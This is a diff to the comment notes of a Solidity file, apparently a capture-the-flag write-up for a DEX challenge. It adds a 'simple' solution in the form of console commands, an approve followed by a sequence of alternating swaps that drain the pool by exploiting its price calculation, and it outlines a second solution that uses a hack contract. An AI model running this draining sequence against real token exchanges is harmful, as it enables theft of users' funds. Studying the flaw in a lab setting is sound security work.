@@ -15,15 +15,29 @@ pragma solidity ^0.8.0;
 
   69          110                    41    ->    0                            65   
 
-  110         45                     0      <-   65(swap 45 only)        (amount *110)/45 = 110  =>amount = 45  => (41*120)/45 =110
+  110         45                     0      <-   65(swap 45 only)        (amount *110)/45 = 110  =>amount = 45  => (45*120)/45 =110
 
   0           90                     110          0
 
 ____________________________________________________________________________________________________________________________________________________________________________________
 
- only msg.sender = EOA when Dex is deployed can call approve function in Dex to approve hack contract to spend Token A + Token B
+solution 1   (Simple)
+(In console )
+                  $  approve( Dex address ,10000)   
+                  $  await contract.swap(i,j,10)
+                  $  await contract.swap(j,i,20)
+                  $  await contract.swap(i,j,24)
+                  $  await contract.swap(j,i,30)
+                  $  await contract.swap(i,j,41)
+                  $  await contract.swap(j,i,45)
+___________________________________________________________________________________________________________________________________________________________________________________ 
+
+solution 2  (Complex)
+
+
+  only msg.sender = EOA when Dex is deployed can call approve function in Dex to approve hack contract to spend Token A + Token B
                                       or
-   only msg.sender = EOA when Dex is deployed (that indirecty create ERC20 Token A ,Token B ) can approve hack hack contract to spend Token A or Token B respectively
+  only msg.sender = EOA when Dex is deployed (that indirecty create ERC20 Token A ,Token B ) can approve hack hack contract to spend Token A or Token B respectively
 
 
 step 1  -> create hack contract
